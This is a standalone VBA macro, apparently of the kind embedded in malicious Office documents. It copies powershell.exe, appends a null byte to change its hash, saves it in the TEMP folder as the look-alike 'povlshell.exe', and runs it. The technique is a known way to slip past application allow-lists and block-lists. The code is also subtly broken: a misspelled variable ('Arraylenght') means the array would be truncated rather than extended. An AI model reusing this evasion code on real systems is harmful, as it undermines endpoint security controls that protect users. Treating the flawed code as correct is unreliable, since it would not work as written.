Sub AddNull()
 Dim Filename as String
 Dim Bytearray() as Byte
 Filename = "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
 
 Dim bin
 Set bin = CreateObject("ADODB.Stream")
 bin.Type = 1
 bin.Open
 bin.LoadFromFile Filename
 Bytearray = bin.Read
 
 bin.Close
 
 Dim Arraylength as Long
 Arraylength = UBound(Bytearray, 1) - LBound(Bytearray, 1) + 1
 ReDim Preserve Bytearray(Arraylenght)
 Bytearray(Arraylenght) = 0
 
 bin.Open
 bin.Write Bytearray
 Dim newFilename as String
 Dim dir as String
 Dim name as String
 dir = Environ("TEMP")
 name = "povlshell.exe"
 newFilename = dir & "\\" & name
 bin.SaveToFile newFilename, 2
 
 Dim retval
 retval = Shell(newFilename)
 
End Sub
